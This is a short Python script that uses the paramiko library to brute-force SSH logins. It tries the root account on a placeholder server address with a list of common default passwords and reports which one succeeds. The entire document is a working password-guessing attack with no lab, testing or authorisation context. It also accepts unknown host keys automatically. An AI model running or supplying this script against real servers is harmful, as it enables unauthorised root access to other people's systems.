import paramiko

# Server details
host = "<SERVER_IP>"
username = "root"
# List of common passwords to try
passwords = ["root", "toor", "admin"]

for password in passwords:
    try:
        # Initialize SSH client
        client = paramiko.SSHClient()
        # Automatically add the server's host key
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        # Attempt to connect to the server
        client.connect(host, port=22, username=username, password=password)
        print(f"Successfully connected to {host} with password: {password}")
        break
    except paramiko.AuthenticationException:
        print(f"Failed to connect to {host} with password: {password}")